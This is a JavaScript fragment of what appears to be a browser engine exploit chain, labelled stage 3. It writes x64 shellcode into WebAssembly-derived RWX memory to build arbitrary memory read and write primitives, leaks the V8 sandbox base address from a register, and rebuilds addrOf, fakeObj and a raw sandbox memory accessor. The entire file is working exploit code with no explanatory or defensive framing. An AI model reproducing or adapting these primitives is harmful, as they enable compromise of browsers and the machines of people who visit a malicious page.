// Export common shellcodes for x64 once code execution is reliable
// Bootstrap stage-3 primitives, leak SANDBOX_BASE
{
    if (FINGERPRINT.platform.arch === "x64") {
        log("[i] Loading x64 shellcodes", 1);


        // Bootstrap new arbRead() & arbWrite() primitives
        let arbread_shellcode = [0x48, 0x8B, 0x00, 0xC3];         // mov rax, [rax]; ret
        let [arbread_rwx, arbReadRWX] = getRWX(1);
        writeShellcode(arbread_shellcode, arbread_rwx);
        arbRead = arbReadRWX;

        let arbwrite_shellcode = [0x48, 0x89, 0x10, 0xC3];        // mov [rax], rdx; ret
        let [arbwrite_rwx, arbWriteRWX] = getRWX(2);
        writeShellcode(arbwrite_shellcode, arbwrite_rwx);
        arbWrite = arbWriteRWX;


        // Leak SANDBOX_BASE if it is still undefined
        if (typeof SANDBOX_BASE === "undefined") {
            let sbx_leak_shellcode = [0x4C, 0x89, 0xF0, 0xC3];    // mov rax, r14; ret
            let [sbxLeakRWX_addr, sbxLeakRWX] = getRWX(0, true);
            writeShellcode(sbx_leak_shellcode, sbxLeakRWX_addr);
            SANDBOX_BASE = sbxLeakRWX();
            log("[+] Leaked SANDBOX_BASE=0x" + hex(SANDBOX_BASE), 2);
            assert((SANDBOX_BASE > 0x0n) && ((SANDBOX_BASE & 0xffffffffn) === 0x0n), "[-] Invalid SANDBOX_BASE pointer");
        }


        // Bootstrap new addrOf(), fakeObj()
        let confuse_shellcode = [0xC3];     // ret
        let [addrof_rwx, addrOfRWX] = getWasmRWX([kWasmExternRef], [kWasmI64], [...wasmI64Const(0x1337deadbeef1337n)]);
        let [fakeobj_rwx, fakeObjRWX] = getWasmRWX([kWasmI64, kWasmExternRef], [kWasmExternRef], [...wasmI64Const(0x1337deadbeef1337n), kExprDrop, kExprLocalGet, 1]);
        writeShellcode(confuse_shellcode, addrof_rwx);
        writeShellcode(confuse_shellcode, fakeobj_rwx);

        var addrOf = (obj) => Number(addrOfRWX(obj) - SANDBOX_BASE);
        var fakeObj = (addr) => fakeObjRWX(SANDBOX_BASE + BigInt(addr), {});


        // Clean stage-2 memory layouts
        clean("stage2");


        // Bootstrap new sbxMemory
        let buf = new ArrayBuffer(8);
        let dv = new DataView(buf);

        let dataviewProxyGet = (name) => {
            return (addr, ...args) => {
                dv.setBigUint64(0, 0n, true);
                addr = SANDBOX_BASE + BigInt(addr);
                let val = arbRead(addr);
                dv.setBigUint64(0, val, true);
                return dv[name](0, ...args);
            }
        }

        let dataviewProxySet = (name) => {
            return (addr, ...args) => {
                dv.setBigUint64(0, 0n, true);
                addr = SANDBOX_BASE + BigInt(addr);
                let val = arbRead(addr);
                dv.setBigUint64(0, val, true);
                let retval = dv[name](0, ...args);
                arbWrite(addr, dv.getBigUint64(0, true));
                return retval;
            }
        }

        var sbxMemory = {};
        for (let method of Object.getOwnPropertyNames(DataView.prototype)) {
            if (method.startsWith("get")) {
                sbxMemory[method] = dataviewProxyGet(method);
            } else if (method.startsWith("set")) {
                sbxMemory[method] = dataviewProxySet(method);
            }
        }

        log("[+] Successfully bootstrapped stage-3 primitives", 1);
    }
}
